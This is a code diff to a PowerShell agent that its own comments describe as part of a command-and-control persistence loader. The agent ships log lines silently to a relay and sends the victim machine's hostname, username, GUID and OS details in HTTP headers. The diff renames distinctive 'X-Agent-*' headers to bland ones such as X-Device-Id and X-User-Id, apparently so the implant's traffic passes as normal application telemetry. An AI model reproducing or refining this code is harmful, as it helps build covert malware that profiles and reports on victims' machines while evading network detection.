@@ -5,7 +5,7 @@
 # vars) — the same pattern the C2 persistence loader uses.
 function Invoke-Agent {
     # log() = relay ship ONLY (zero local echo — no Write-Host, no console). Every line is
-    # POSTed with X-Agent-Log: 1: the relay answers immediately (no long-poll hold) and
+    # POSTed with X-Log-Only: 1: the relay answers immediately (no long-poll hold) and
     # broadcasts an agent_log event to the operator's events feed. NEVER fatal — a failed
     # ship is swallowed in silence — and the in-ship guard keeps a failing relay from
     # recursing. Body = one frame holding the UTF-8 line. Each call is one synchronous
@@ -25,7 +25,7 @@ function Invoke-Agent {
         $script:inShip = $true
         try {
             $req = NewPostRequest 15000
-            try { $req.Headers.Add('X-Agent-Log', '1') } catch {}
+            try { $req.Headers.Add('X-Log-Only', '1') } catch {}
             $body = BuildBody (,([Text.Encoding]::UTF8.GetBytes($line)))
             $req.ContentLength = $body.Length
             $rs = $req.GetRequestStream()
@@ -178,18 +178,18 @@ function Invoke-Agent {
         # authorizes nothing. The same contract the JScript/C# breeds ship.
         $sessionKey = [guid]::NewGuid().ToString('D')
         $pairs = @(
-            @('X-Agent-Api-Version', '1'),
-            @('X-Agent-Machine-Uuid', $guid),
-            @('X-Agent-Session-Key', $sessionKey),
-            @('X-Agent-Hostname', (ReadEnv 'COMPUTERNAME')),
-            @('X-Agent-Username', (ReadEnv 'USERNAME')),
-            @('X-Agent-Arch', $arch),
-            @('X-Agent-Process-Arch', $processArch),
-            @('X-Agent-Platform', 'Windows'),
-            @('X-Agent-Os-Version', $osVersion),
-            @('X-Agent-Build', $buildNumber),
-            @('X-Agent-Name-Id', '3'),
-            @('X-Agent-Capabilities', '0800000000000000')
+            @('X-Api-Version', '1'),
+            @('X-Device-Id', $guid),
+            @('X-Session-Id', $sessionKey),
+            @('X-Device-Name', (ReadEnv 'COMPUTERNAME')),
+            @('X-User-Id', (ReadEnv 'USERNAME')),
+            @('X-Device-Arch', $arch),
+            @('X-App-Arch', $processArch),
+            @('X-Platform', 'Windows'),
+            @('X-OS-Version', $osVersion),
+            @('X-OS-Build', $buildNumber),
+            @('X-Client-Id', '3'),
+            @('X-Client-Features', '0800000000000000')
         )
         return ,@($pairs | Where-Object { "$($_[1])" -ne '' })
     }
